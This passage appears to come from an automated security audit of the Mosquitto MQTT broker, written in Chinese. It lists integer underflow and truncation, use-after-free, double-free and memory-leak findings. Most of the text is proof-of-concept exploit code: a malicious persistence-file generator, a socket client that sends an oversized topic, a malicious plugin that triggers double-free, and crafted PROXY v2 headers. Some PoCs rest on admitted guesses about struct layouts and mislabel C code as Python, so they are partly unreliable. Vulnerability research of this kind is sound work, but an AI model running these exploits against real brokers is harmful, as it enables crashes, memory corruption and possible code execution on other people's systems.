    # 计算下溢后的值用于验证
    underflowed_length = (malicious_length - (sizeof_pf_client_msg + malicious_id_len)) & 0xFFFFFFFF
    print(f"[*] 原始 length: {malicious_length}")
    print(f"[*] sizeof(PF_client_msg): {sizeof_pf_client_msg}")
    print(f"[*] id_len: {malicious_id_len}")
    print(f"[*] 下溢后 length: {underflowed_length} (0x{underflowed_length:08x})")
    print(f"[*] MQTT_MAX_PAYLOAD 典型值: 268435455 (0x0FFFFFFF)")
    
    if underflowed_length > 268435455:
        print("[!] 下溢后的 length 超过 MQTT_MAX_PAYLOAD，需要调整参数")
        print("[*] 尝试调整 id_len 使下溢后值小于 MQTT_MAX_PAYLOAD")
        
        # 我们需要下溢后的值 < MQTT_MAX_PAYLOAD (268435455)
        # 即 (length - sizeof - id_len) mod 2^32 < 268435455
        # 设 length = 100, sizeof = 16, 则 id_len 需要满足:
        # (100 - 16 - id_len) mod 2^32 < 268435455
        # 即 (84 - id_len) mod 2^32 < 268435455
        # 当 id_len = 84 + 268435454 = 268435538 时，下溢后值为 268435454
        
        target_length = 100
        target_underflow = 268435454  # 略小于 MQTT_MAX_PAYLOAD
        target_id_len = target_length - sizeof_pf_client_msg + (0xFFFFFFFF - target_underflow + 1)
        
        print(f"[*] 调整后参数:")
        print(f"[*]   length: {target_length}")
        print(f"[*]   id_len: {target_id_len}")
        
        malicious_length = target_length
        malicious_id_len = target_id_len
        underflowed_length = (malicious_length - (sizeof_pf_client_msg + malicious_id_len)) & 0xFFFFFFFF
        print(f"[*]   下溢后 length: {underflowed_length}")
    
    # 构建文件内容
    with open(output_path, 'wb') as f:
        # 写入 chunk header
        # chunk type (4 bytes, network byte order)
        f.write(struct.pack('!I', chunk_type))
        # chunk length (4 bytes, network byte order)
        f.write(struct.pack('!I', malicious_length))
        
        # 写入 PF_client_msg 结构体
        # 这里需要根据实际结构体定义填充
        # 假设结构体包含 mid(2), id_len(2), 以及其他字段
        # 我们只关注 id_len 字段
        
        # 填充 PF_client_msg (假设16字节)
        pf_client_msg = bytearray(sizeof_pf_client_msg)
        # 设置 id_len 为恶意值 (network byte order)
        struct.pack_into('!H', pf_client_msg, 2, malicious_id_len)  # 假设 id_len 在偏移2处
        f.write(pf_client_msg)
        
        # 写入 clientid 字符串 (id_len 字节)
        # 这里可以填充任意数据
        f.write(b'A' * malicious_id_len)
        
        # 注意：实际利用时，后续的 mosquitto_malloc(length) 会分配大量内存
        # 可能导致拒绝服务或内存耗尽
    
    print(f"[+] 恶意持久化文件已创建: {output_path}")
    print(f"[+] 文件大小: {os.path.getsize(output_path)} 字节")
    
    return output_path


def verify_exploit_conditions():
    """验证漏洞利用条件"""
    print("\n[*] 漏洞利用前置条件检查:")
    print("  [1] 攻击者需要能够写入 Mosquitto 持久化文件")
    print("  [2] Mosquitto 需要配置使用持久化功能 (WITH_PERSISTENCE)")
    print("  [3] 持久化文件路径需要可写 (通常为 /var/lib/mosquitto/mosquitto.db)")
    print("  [4] Mosquitto 服务需要重启以加载恶意持久化文件")
    print("\n[*] 预期影响:")
    print("  [1] 整数下溢导致 length 变为极大值")
    print("  [2] 绕过 MQTT_MAX_PAYLOAD 检查")
    print("  [3] mosquitto_malloc(length) 分配超大内存，可能导致:")
    print("      - 拒绝服务 (内存耗尽)")
    print("      - 后续读取越界 (读取超出文件范围的数据)")
    print("      - 潜在的信息泄露")


if __name__ == "__main__":
    print("=" * 60)
    print("PoC for VULN-C3AB25C8 - Integer Underflow")
    print("Mosquitto Broker Persistence Integer Underflow")
    print("仅供安全研究使用")
    print("=" * 60)
    
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <输出文件路径>")
        print(f"示例: {sys.argv[0]} malicious_persist.db")
        sys.exit(1)
    
    output_path = sys.argv[1]
    create_malicious_persist_file(output_path)
    verify_exploit_conditions()
    
    print("\n[!] 警告: 将此文件加载到 Mosquitto 将触发漏洞")
    print("[!] 请勿在生产环境中测试")

```

---

### VULN-99EF9520 - 整数溢出/截断

- **严重等级:** MEDIUM
- **文件位置:** `src/persist_write.c:219`
- **数据流:** thistopic由topic和node->topic拼接而成，可能超过65535字节
- **判断理由:** 与上述类似，size_t到uint16_t的强制转换可能导致数据截断

**代码片段:**
```
sub_chunk.F.topic_len = (uint16_t)strlen(thistopic);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-99EF9520 - Integer truncation in persist__subs_save

仅供研究使用 (For research purposes only)
"""

import socket
import struct
import sys

# 目标MQTT Broker配置
BROKER_HOST = "127.0.0.1"
BROKER_PORT = 1883

# 构造一个超长主题，长度超过65535字节
# 使用重复的'A'字符填充
TOPIC_BASE = "test/"
# 计算需要填充的字符数，使总长度超过65535
# 主题格式: "test/" + 重复的'A' * N
TARGET_LENGTH = 65536  # 超过uint16_t最大值
PADDING_LENGTH = TARGET_LENGTH - len(TOPIC_BASE)

# 构造超长主题字符串
long_topic = TOPIC_BASE + "A" * PADDING_LENGTH

print(f"[+] 构造超长主题，长度: {len(long_topic)} 字节")
print(f"[+] 注意: 该长度超过uint16_t最大值(65535)，将导致截断")

def create_mqtt_connect_packet():
    """创建MQTT CONNECT报文"""
    # 可变头部
    protocol_name = b"MQTT"
    protocol_version = 4  # MQTT 3.1.1
    connect_flags = 0x02  # Clean Session
    keep_alive = 60
    
    # 构建可变头部
    variable_header = struct.pack("!H", len(protocol_name)) + protocol_name
    variable_header += struct.pack("!BBH", protocol_version, connect_flags, keep_alive)
    
    # 载荷 - 客户端ID
    client_id = b"poc_client_" + str(id({})).encode()[:8]
    payload = struct.pack("!H", len(client_id)) + client_id
    
    # 固定头部
    remaining_length = len(variable_header) + len(payload)
    fixed_header = struct.pack("!B", 0x10)  # CONNECT报文类型
    
    # 编码剩余长度
    if remaining_length < 128:
        fixed_header += struct.pack("!B", remaining_length)
    elif remaining_length < 16384:
        fixed_header += struct.pack("!BB", remaining_length | 0x80, remaining_length >> 7)
    else:
        fixed_header += struct.pack("!BBB", (remaining_length & 0x7F) | 0x80, 
                                    ((remaining_length >> 7) & 0x7F) | 0x80,
                                    remaining_length >> 14)
    
    return fixed_header + variable_header + payload

def create_mqtt_subscribe_packet(topic):
    """创建MQTT SUBSCRIBE报文"""
    packet_id = 1
    
    # 可变头部
    variable_header = struct.pack("!H", packet_id)
    
    # 载荷 - 主题过滤器
    topic_bytes = topic.encode('utf-8')
    payload = struct.pack("!H", len(topic_bytes)) + topic_bytes + struct.pack("!B", 0)  # QoS 0
    
    # 固定头部
    remaining_length = len(variable_header) + len(payload)
    fixed_header = struct.pack("!B", 0x82)  # SUBSCRIBE报文类型
    
    # 编码剩余长度
    if remaining_length < 128:
        fixed_header += struct.pack("!B", remaining_length)
    elif remaining_length < 16384:
        fixed_header += struct.pack("!BB", remaining_length | 0x80, remaining_length >> 7)
    else:
        fixed_header += struct.pack("!BBB", (remaining_length & 0x7F) | 0x80,
                                    ((remaining_length >> 7) & 0x7F) | 0x80,
                                    remaining_length >> 14)
    
    return fixed_header + variable_header + payload

def exploit():
    """执行PoC"""
    print("[*] 开始PoC执行...")
    print("[*] 目标: {}:{}".format(BROKER_HOST, BROKER_PORT))
    
    try:
        # 创建TCP连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((BROKER_HOST, BROKER_PORT))
        print("[+] TCP连接建立成功")
        
        # 发送CONNECT报文
        connect_packet = create_mqtt_connect_packet()
        sock.send(connect_packet)
        print("[+] CONNECT报文已发送")
        
        # 接收CONNACK
        connack = sock.recv(4)
        if len(connack) >= 4 and connack[0] == 0x20:
            print("[+] CONNACK已接收，连接成功")
        else:
            print("[-] 连接失败")
            sock.close()
            return
        
        # 发送包含超长主题的SUBSCRIBE报文
        subscribe_packet = create_mqtt_subscribe_packet(long_topic)
        print(f"[+] SUBSCRIBE报文大小: {len(subscribe_packet)} 字节")
        sock.send(subscribe_packet)
        print("[+] SUBSCRIBE报文已发送")
        
        # 尝试接收SUBACK
        try:
            suback = sock.recv(5)
            if len(suback) >= 5 and suback[0] == 0x90:
                print("[+] SUBACK已接收")
        except socket.timeout:
            print("[-] 接收SUBACK超时")
        
        # 发送DISCONNECT
        disconnect_packet = struct.pack("!BB", 0xE0, 0x00)
        sock.send(disconnect_packet)
        print("[+] DISCONNECT已发送")
        
        sock.close()
        print("[+] TCP连接已关闭")
        
        print("\n[!] 漏洞触发完成")
        print("[!] 当Broker尝试持久化订阅信息时，topic_len将被截断")
        print("[!] 实际存储的topic_len值: {} (截断后)".format(len(long_topic) & 0xFFFF))
        print("[!] 原始topic长度: {}".format(len(long_topic)))
        print("[!] 差异: {} 字节".format(len(long_topic) - (len(long_topic) & 0xFFFF)))
        
    except Exception as e:
        print(f"[-] 错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    print("=" * 60)
    print("PoC for VULN-99EF9520 - Integer Truncation Vulnerability")
    print("仅供研究使用 (For research purposes only)")
    print("=" * 60)
    print()
    exploit()
```

---

### VULN-4953569C - Use-After-Free / Double-Free

- **严重等级:** CRITICAL
- **文件位置:** `src\plugin_message.c:49`
- **数据流:** plugin__handle_message_single() 接收 callbacks 回调列表，在 DL_FOREACH_SAFE 循环中依次调用每个回调函数。回调函数可以修改 event_data 中的 topic/payload/properties 指针。当回调修改了这些指针后，代码会释放旧的指针并更新为新的指针。但存在以下问题：1) 多个回调可能共享同一个 event_data 结构体，第一个回调释放了旧指针后，第二个回调可能再次尝试释放同一个指针；2) 回调函数可能返回 event_data 中指向已被释放内存的指针。
- **判断理由:** 在 DL_FOREACH_SAFE 循环中，多个回调函数依次执行。每个回调都可以修改 event_data 中的 topic、payload、properties 指针。当第一个回调修改了 topic 指针后，代码会释放旧的 stored->topic 并更新为新的指针。但第二个回调可能再次修改 event_data.topic，此时 stored->topic 已经是第一个回调设置的新值，如果第二个回调将 event_data.topic 设置为之前已被释放的旧指针，就会导致 use-after-free。此外，如果两个回调都修改了同一个字段，且 to_free 标志已被设置为 true，第二个回调会尝试释放已经被第一个回调释放的内存，导致 double-free。

**代码片段:**
```
if(stored->topic != event_data.topic){
    if(to_free->topic){
        mosquitto_FREE(stored->topic);
    }
    stored->topic = event_data.topic;
    to_free->topic = true;
}
```

**PoC代码:**
```python
/*
 * PoC for VULN-4953569C - Use-After-Free / Double-Free in Mosquitto
 * Plugin Message Handling
 * 
 * 仅供研究使用 - For Research Purposes Only
 * 
 * 编译: gcc -shared -fPIC -o exploit_plugin.so exploit_plugin.c
 * 使用: 在 mosquitto.conf 中添加 plugin /path/to/exploit_plugin.so
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mosquitto_plugin.h>
#include <mosquitto_broker.h>

/* 全局变量用于保存被释放的指针 */
static char *freed_topic = NULL;
static int callback_count = 0;

/*
 * 第一个回调函数: 修改 topic 指针
 * 触发 double-free 场景
 */
int callback_modify_topic(int event_type, void *event_data, void *userdata)
{
    struct mosquitto_evt_message *msg = (struct mosquitto_evt_message *)event_data;
    
    /* 保存原始 topic 指针供后续使用 */
    if (callback_count == 0) {
        freed_topic = msg->topic;
        
        /* 分配新的 topic 字符串 */
        char *new_topic = strdup("modified/topic/1");
        if (new_topic) {
            msg->topic = new_topic;
        }
        callback_count++;
    }
    
    return MOSQ_ERR_SUCCESS;
}

/*
 * 第二个回调函数: 将 topic 设置为之前已被释放的指针
 * 触发 use-after-free 场景
 */
int callback_use_freed_topic(int event_type, void *event_data, void *userdata)
{
    struct mosquitto_evt_message *msg = (struct mosquitto_evt_message *)event_data;
    
    if (callback_count == 1 && freed_topic != NULL) {
        /* 将 topic 设置为第一个回调中已被释放的指针 */
        msg->topic = freed_topic;
        callback_count++;
    }
    
    return MOSQ_ERR_SUCCESS;
}

/*
 * 第三个回调函数: 再次修改 topic
 * 触发 double-free (因为 to_free->topic 已经是 true)
 */
int callback_double_free(int event_type, void *event_data, void *userdata)
{
    struct mosquitto_evt_message *msg = (struct mosquitto_evt_message *)event_data;
    
    if (callback_count == 2) {
        /* 分配另一个新 topic，触发对已释放内存的再次释放 */
        char *new_topic = strdup("modified/topic/3");
        if (new_topic) {
            msg->topic = new_topic;
        }
        callback_count++;
    }
    
    return MOSQ_ERR_SUCCESS;
}

/*
 * 第四个回调函数: 同时修改 payload 和 properties
 * 展示多字段的 double-free 场景
 */
int callback_modify_payload_properties(int event_type, void *event_data, void *userdata)
{
    struct mosquitto_evt_message *msg = (struct mosquitto_evt_message *)event_data;
    
    /* 修改 payload */
    void *old_payload = msg->payload;
    msg->payload = strdup("modified_payload");
    msg->payloadlen = strlen("modified_payload");
    
    /* 保存旧 payload 指针供后续回调使用 */
    *(void **)userdata = old_payload;
    
    return MOSQ_ERR_SUCCESS;
}

/*
 * 第五个回调函数: 使用已被释放的 payload 指针
 * 触发 use-after-free
 */
int callback_use_freed_payload(int event_type, void *event_data, void *userdata)
{
    struct mosquitto_evt_message *msg = (struct mosquitto_evt_message *)event_data;
    void *freed_ptr = *(void **)userdata;
    
    if (freed_ptr != NULL) {
        /* 尝试使用已被释放的 payload 指针 */
        msg->payload = freed_ptr;
        msg->payloadlen = 100;  /* 可能导致越界读取 */
    }
    
    return MOSQ_ERR_SUCCESS;
}

/* 插件初始化函数 */
int mosquitto_plugin_init(mosquitto_plugin_id_t *identifier, void **userdata, struct mosquitto_opt *options, int opt_count)
{
    /* 注册多个回调函数到 message_in 事件 */
    mosquitto_callback_register(identifier, MOSQ_EVT_MESSAGE_IN, callback_modify_topic, NULL, NULL);
    mosquitto_callback_register(identifier, MOSQ_EVT_MESSAGE_IN, callback_use_freed_topic, NULL, NULL);
    mosquitto_callback_register(identifier, MOSQ_EVT_MESSAGE_IN, callback_double_free, NULL, NULL);
    
    /* 分配内存用于保存指针 */
    *userdata = calloc(1, sizeof(void *));
    mosquitto_callback_register(identifier, MOSQ_EVT_MESSAGE_IN, callback_modify_payload_properties, *userdata, NULL);
    mosquitto_callback_register(identifier, MOSQ_EVT_MESSAGE_IN, callback_use_freed_payload, *userdata, NULL);
    
    return MOSQ_ERR_SUCCESS;
}

/* 插件清理函数 */
int mosquitto_plugin_cleanup(void *userdata, struct mosquitto_opt *options, int opt_count)
{
    if (userdata) {
        free(userdata);
    }
    return MOSQ_ERR_SUCCESS;
}

/*
 * 触发漏洞的 Python 脚本 (替代方案)
 * 使用 paho-mqtt 客户端发送消息触发插件回调
 */
/*
import paho.mqtt.client as mqtt
import time

def on_connect(client, userdata, flags, rc):
    print("Connected with result code " + str(rc))
    # 发送消息触发漏洞
    client.publish("test/topic", "test payload")

def on_message(client, userdata, msg):
    print(msg.topic + " " + str(msg.payload))

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

client.connect("localhost", 1883, 60)
client.loop_start()
time.sleep(1)
client.loop_stop()
*/

```

---

### VULN-43640FB4 - Memory Leak

- **严重等级:** MEDIUM
- **文件位置:** `src\plugin_message.c:49`
- **数据流:** 当回调函数修改了 event_data.topic 但返回非 MOSQ_ERR_SUCCESS 时，循环会提前退出。此时 to_free->topic 可能已被设置为 true，但 stored->topic 指向的是回调设置的新指针。调用者无法知道是否需要释放这个新指针。
- **判断理由:** 在 plugin__handle_message_single() 中，如果某个回调返回错误（rc != MOSQ_ERR_SUCCESS），循环会立即 break。此时如果该回调已经修改了 topic/payload/properties 并设置了 to_free 标志，那么新分配的指针会被存储在 stored 结构中，但调用者可能不会释放这些新指针，导致内存泄漏。特别是在 plugin__handle_message_in() 中，to_free 初始化为 {true, true, true}，但错误路径下新指针的释放逻辑不明确。

**代码片段:**
```
if(stored->topic != event_data.topic){
    if(to_free->topic){
        mosquitto_FREE(stored->topic);
    }
    stored->topic = event_data.topic;
    to_free->topic = true;
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: Mosquitto Broker 插件消息处理内存泄漏
 * 漏洞ID: VULN-43640FB4
 * 
 * 此PoC演示了通过恶意插件回调触发内存泄漏的路径
 */

#include <mosquitto.h>
#include <mosquitto_broker.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* 恶意插件回调 - 修改topic并返回错误码 */
int malicious_callback(int event, void *event_data, void *userdata)
{
    struct mosquitto_evt_message *msg = (struct mosquitto_evt_message *)event_data;
    
    /* 分配新topic - 模拟恶意行为 */
    char *new_topic = strdup("malicious/topic/leak");
    if (!new_topic) {
        return MOSQ_ERR_NOMEM;
    }
    
    /* 修改event_data中的topic指针 */
    msg->topic = new_topic;
    
    /* 返回错误码，触发提前退出循环 */
    return MOSQ_ERR_INVAL;
}

/* 第二个恶意回调 - 修改payload并返回错误码 */
int malicious_callback_payload(int event, void *event_data, void *userdata)
{
    struct mosquitto_evt_message *msg = (struct mosquitto_evt_message *)event_data;
    
    /* 分配新payload */
    void *new_payload = malloc(100);
    if (!new_payload) {
        return MOSQ_ERR_NOMEM;
    }
    memset(new_payload, 0x41, 100);
    
    /* 修改event_data中的payload指针 */
    msg->payload = new_payload;
    msg->payloadlen = 100;
    
    /* 返回错误码 */
    return MOSQ_ERR_UNKNOWN;
}

/* 第三个恶意回调 - 修改properties并返回错误码 */
int malicious_callback_properties(int event, void *event_data, void *userdata)
{
    struct mosquitto_evt_message *msg = (struct mosquitto_evt_message *)event_data;
    
    /* 创建新properties */
    mosquitto_property *props = NULL;
    mosquitto_property_add_string(&props, MQTT_PROP_CONTENT_TYPE, "text/leak");
    
    /* 修改event_data中的properties指针 */
    msg->properties = props;
    
    /* 返回错误码 */
    return MOSQ_ERR_PROTOCOL;
}

/* 演示内存泄漏的测试函数 */
void demonstrate_memory_leak(void)
{
    printf("[*] 演示 Mosquitto 插件消息处理内存泄漏 (VULN-43640FB4)\n");
    printf("[*] 仅供研究使用\n\n");
    
    /* 模拟stored消息结构 */
    struct mosquitto_base_msg stored;
    stored.topic = strdup("original/topic");
    stored.payload = malloc(50);
    memset(stored.payload, 0x42, 50);
    stored.payloadlen = 50;
    stored.properties = NULL;
    stored.qos = 1;
    stored.retain = 0;
    
    printf("[*] 原始消息:\n");
    printf("    topic: %s\n", stored.topic);
    printf("    payload: %p (len=%d)\n", stored.payload, stored.payloadlen);
    
    /* 模拟plugin__handle_message_single中的循环 */
    struct should_free to_free = {true, true, true};  /* 如plugin__handle_message_in中的初始化 */
    
    /* 模拟第一个回调 - 修改topic并返回错误 */
    struct mosquitto_evt_message event_data;
    memset(&event_data, 0, sizeof(event_data));
    event_data.topic = stored.topic;
    event_data.payload = stored.payload;
    event_data.payloadlen = stored.payloadlen;
    event_data.properties = stored.properties;
    
    printf("\n[*] 步骤1: 调用恶意回调修改topic并返回错误\n");
    int rc = malicious_callback(MOSQ_EVT_MESSAGE_IN, &event_data, NULL);
    printf("    回调返回: %d\n", rc);
    
    /* 模拟漏洞路径 - 循环break后stored被更新但to_free标志已设置 */
    if (stored.topic != event_data.topic) {
        /* 这里本应释放旧topic，但由于to_free->topic为true，会释放 */
        if (to_free.topic) {
            printf("    释放旧topic: %s\n", stored.topic);
            free(stored.topic);  /* 模拟mosquitto_FREE */
        }
        stored.topic = event_data.topic;  /* 新指针被存储 */
        to_free.topic = true;
        printf("    新topic已存储: %s (to_free.topic=%d)\n", stored.topic, to_free.topic);
    }
    
    printf("\n[*] 漏洞效果: 新分配的topic指针 '%s' 存储在stored中\n", stored.topic);
    printf("    但调用者(plugin__handle_message_in)在错误路径下不会释放此指针\n");
    printf("    导致内存泄漏 (每次消息处理泄漏 %zu 字节)\n", strlen(stored.topic) + 1);
    
    /* 模拟payload泄漏 */
    printf("\n[*] 步骤2: 调用恶意回调修改payload并返回错误\n");
    memset(&event_data, 0, sizeof(event_data));
    event_data.topic = stored.topic;
    event_data.payload = stored.payload;
    event_data.payloadlen = stored.payloadlen;
    
    rc = malicious_callback_payload(MOSQ_EVT_MESSAGE_IN, &event_data, NULL);
    printf("    回调返回: %d\n", rc);
    
    if (stored.payload != event_data.payload) {
        if (to_free.payload) {
            printf("    释放旧payload: %p\n", stored.payload);
            free(stored.payload);
        }
        stored.payload = event_data.payload;
        stored.payloadlen = event_data.payloadlen;
        to_free.payload = true;
        printf("    新payload已存储: %p (len=%d, to_free.payload=%d)\n", 
               stored.payload, stored.payloadlen, to_free.payload);
    }
    
    printf("\n[*] 漏洞效果: 新分配的payload指针 %p 存储在stored中\n", stored.payload);
    printf("    同样不会被释放，导致额外 %d 字节泄漏\n", stored.payloadlen);
    
    /* 清理 - 模拟正常路径下的释放 */
    printf("\n[*] 注意: 在正常路径下，这些指针会在后续被释放\n");
    printf("    但在错误路径下(回调返回非MOSQ_ERR_SUCCESS)，释放逻辑被跳过\n");
    
    /* 手动清理避免实际泄漏 */
    free(stored.topic);
    free(stored.payload);
    if (stored.properties) {
        mosquitto_property_free_all(&stored.properties);
    }
    
    printf("\n[*] PoC演示完成\n");
}

int main(void)
{
    demonstrate_memory_leak();
    return 0;
}

```

---

### VULN-01ADD1DB - 整数溢出/截断

- **严重等级:** HIGH
- **文件位置:** `src/proxy_v2.c:155`
- **数据流:** 用户控制的tlv_len -> 计算剩余长度和位置 -> uint16_t截断
- **判断理由:** len和pos的减法/加法操作后强制转换为uint16_t，当tlv_len大于len时会导致负数截断为很大的正数，破坏循环控制逻辑。

**代码片段:**
```
len = (uint16_t)(len - (sizeof(uint8_t) + sizeof(uint8_t) + sizeof(uint8_t) + tlv_len));
context->proxy.pos = (uint16_t)(context->proxy.pos + tlv_len);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-01ADD1DB - Integer truncation in read_tlv_ssl
仅供研究使用
"""
import socket
import struct
import sys

def build_malicious_proxy_header():
    """
    构造恶意PROXY协议v2头部，触发整数截断漏洞
    
    漏洞原理：
    在read_tlv_ssl函数中，当处理SSL TLV时，以下代码存在整数截断：
    len = (uint16_t)(len - (sizeof(uint8_t) + sizeof(uint8_t) + sizeof(uint8_t) + tlv_len));
    context->proxy.pos = (uint16_t)(context->proxy.pos + tlv_len);
    
    当tlv_len大于len时，减法结果为负数，强制转换为uint16_t后变为很大的正数，
    导致循环控制变量len异常增大，可能造成越界读取。
    """
    
    # PROXY协议v2签名
    sig = b'\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A'
    
    # ver_cmd: 版本2 + 本地命令(0x00)
    ver_cmd = 0x20  # 0x20 = PROXY_CMD_LOCAL | 0x20 (version 2)
    
    # fam: TCP/IPv4 (0x11)
    fam = 0x11
    
    # 计算TLV总长度
    # 我们需要构造一个SSL TLV，其中tlv_len大于剩余len
    
    # 首先构造SSL TLV头
    # PP2_TYPE_SSL = 0x20
    # PP2_SUBTYPE_SSL_VERSION = 0x21
    
    # SSL TLV结构:
    # - type (1 byte): PP2_TYPE_SSL = 0x20
    # - length_h (1 byte): 高字节
    # - length_l (1 byte): 低字节
    # - value: SSL结构体
    
    # SSL结构体:
    # - client (1 byte): 标志位
    # - verify (4 bytes): 验证结果
    # - 子TLVs...
    
    # 构造一个正常的SSL TLV头
    ssl_client = 0x01  # PP2_CLIENT_SSL
    ssl_verify = 0x00000000  # 验证通过
    
    # SSL TLV的value部分
    ssl_value = struct.pack('!BI', ssl_client, ssl_verify)
    
    # 现在构造子TLV，利用整数截断漏洞
    # 我们需要让tlv_len大于剩余len
    # 在read_tlv_ssl中，len初始值为SSL TLV的value长度
    # 减去sizeof(uint8_t) + sizeof(uint32_t) = 5后，剩余len
    
    # 构造一个子TLV，其tlv_len大于剩余len
    # 子TLV类型：PP2_SUBTYPE_SSL_VERSION = 0x21
    sub_tlv_type = 0x21
    
    # 关键：设置tlv_len为一个大于剩余len的值
    # 剩余len = len - 5 = 5 - 5 = 0 (如果SSL value只有5字节)
    # 但我们希望触发截断，所以让tlv_len = 0xFFFE (接近65535)
    sub_tlv_len = 0xFFFE  # 这个值远大于剩余len
    
    # 构造子TLV
    sub_tlv = struct.pack('!BBH', sub_tlv_type, (sub_tlv_len >> 8) & 0xFF, sub_tlv_len & 0xFF)
    # 注意：实际tlv_len是2字节，但这里我们直接构造
    
    # 重新构造子TLV（正确格式）
    sub_tlv = struct.pack('!BB', sub_tlv_type, 0xFF)  # length_h = 0xFF
    sub_tlv += struct.pack('!B', 0xFE)  # length_l = 0xFE
    # tlv_len = 0xFFFE = 65534
    
    # 完整的SSL TLV value = ssl_value + sub_tlv
    ssl_tlv_value = ssl_value + sub_tlv
    
    # SSL TLV长度
    ssl_tlv_len = len(ssl_tlv_value)
    
    # 构造SSL TLV
    ssl_tlv = struct.pack('!BB', 0x20, (ssl_tlv_len >> 8) & 0xFF)
    ssl_tlv += struct.pack('!B', ssl_tlv_len & 0xFF)
    ssl_tlv += ssl_tlv_value
    
    # 计算总TLV长度
    total_tlv_len = len(ssl_tlv)
    
    # 构造PROXY头部
    proxy_header = sig
    proxy_header += struct.pack('!BB', ver_cmd, fam)
    proxy_header += struct.pack('!H', total_tlv_len)
    
    # 添加IPv4地址部分（12字节，但TLV长度已指定，所以可以省略或填充）
    # 实际上，根据PROXY协议，地址部分应该存在，但我们可以利用漏洞
    # 这里我们直接添加TLV
    proxy_header += ssl_tlv
    
    return proxy_header

def send_poc(host='127.0.0.1', port=1883):
    """
    发送PoC到目标服务器
    """
    print(f"[*] 连接目标 {host}:{port}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
        # 发送恶意PROXY头部
        payload = build_malicious_proxy_header()
        print(f"[*] 发送恶意PROXY头部，长度: {len(payload)} 字节")
        print(f"[*] 头部内容 (hex): {payload.hex()}")
        
        sock.send(payload)
        
        # 等待响应
        try:
            response = sock.recv(1024)
            print(f"[*] 收到响应: {response.hex()}")
        except socket.timeout:
            print("[*] 连接超时，可能服务器已崩溃")
        
        sock.close()
        
    except ConnectionRefusedError:
        print("[!] 连接被拒绝，请确保目标服务正在运行")
    except Exception as e:
        print(f"[!] 错误: {e}")

def analyze_vulnerability():
    """
    分析漏洞触发过程
    """
    print("\n=== 漏洞分析 ===")
    print("漏洞位置: src/proxy_v2.c:155")
    print("漏洞类型: 整数截断 (Integer Truncation)")
    print("\n触发过程:")
    print("1. 服务器收到PROXY协议v2头部")
    print("2. 解析到PP2_TYPE_SSL TLV，进入read_tlv_ssl函数")
    print("3. 函数计算剩余len = 原始len - 5 (sizeof(uint8_t) + sizeof(uint32_t))")
    print("4. 进入while循环处理子TLV")
    print("5. 当处理到恶意子TLV时:")
    print("   - tlv_len = 0xFFFE (65534)")
    print("   - len = (uint16_t)(len - (3 + tlv_len))")
    print("   - 如果len < 3 + tlv_len，结果为负数")
    print("   - 强制转换为uint16_t后，负数变为很大的正数")
    print("   - 循环继续执行，导致越界读取")
    print("\n预期效果:")
    print("- 服务器可能崩溃 (段错误)")
    print("- 可能造成信息泄露")
    print("- 可能被利用执行任意代码")

if __name__ == "__main__":
    print("=" * 60)
    print("PoC for VULN-01ADD1DB - Integer Truncation in read_tlv_ssl")
    print("仅供研究使用")
    print("=" * 60)
    
    analyze_vulnerability()
    
    if len(sys.argv) > 1:
        host = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
        send_poc(host, port)
    else:
        print("\n用法: python3 poc.py [host] [port]")
        print("示例: python3 poc.py 127.0.0.1 1883")
```

---

### VULN-39538114 - 整数溢出/截断

- **严重等级:** HIGH
- **文件位置:** `src/proxy_v2.c:183`
- **数据流:** 用户控制的tlv_len -> 更新pos -> uint16_t截断
- **判断理由:** pos累加tlv_len后强制转换为uint16_t，可能导致溢出，使pos值回绕到较小值，绕过后续边界检查。

**代码片段:**
```
context->proxy.pos = (uint16_t)(context->proxy.pos + tlv_len);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-39538114 - Integer truncation in PROXY v2 header parsing
仅供研究使用 - For research purposes only
"""
import socket
import struct
import sys

# PROXY v2 header signature
PROXY_SIG = b'\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A'

# PROXY command: LOCAL (0x00) or PROXY (0x01)
PROXY_CMD_PROXY = 0x21  # ver_cmd: version=2, cmd=PROXY

# Address family: TCP over IPv4
PROXY_TCP_IPV4 = 0x11  # fam: TCP, IPv4

def build_exploit_packet(target_host, target_port):
    """
    构造利用数据包，触发整数截断漏洞
    
    漏洞原理：
    1. 在read_tlv_ssl函数中，pos被多次强制转换为uint16_t
    2. 当pos接近65535时，加上较大的tlv_len会导致回绕
    3. 回绕后pos变小，绕过后续边界检查
    
    利用策略：
    - 构造多个TLV项，使pos逐渐接近65535
    - 最后一个TLV的tlv_len足够大，使pos回绕
    - 回绕后，后续的边界检查使用回绕后的pos值
    - 导致越界读取或写入
    """
    
    # 基础PROXY v2头部
    # 地址部分：12字节 (IPv4)
    addr_part = struct.pack('!4s4sHH', 
                          socket.inet_aton('192.168.1.1'),  # src
                          socket.inet_aton('10.0.0.1'),     # dst
                          12345,  # src port
                          80)     # dst port
    
    # 构造TLV列表
    tlvs = []
    
    # 步骤1: 添加填充TLV，使pos接近65535
    # 每个TLV头部3字节 + 数据
    # 我们需要pos达到约65535 - 100的位置
    
    # 先计算当前pos
    # 初始pos = 16 (signature) + 1 (ver_cmd) + 1 (fam) + 2 (len) + 12 (addr) = 32
    base_pos = 16 + 1 + 1 + 2 + 12  # = 32
    
    # 目标：使pos接近65535
    # 每个TLV增加3 + data_len
    # 使用PP2_TYPE_NOOP (0x04) 作为填充
    
    target_pos = 65535 - 200  # 留一些余量
    remaining = target_pos - base_pos
    
    # 添加填充TLV
    while remaining > 0:
        # 每个TLV至少3字节头部
        if remaining >= 3 + 255:  # 最大数据长度255
            data_len = 255
        elif remaining >= 3:
            data_len = remaining - 3
        else:
            break
        
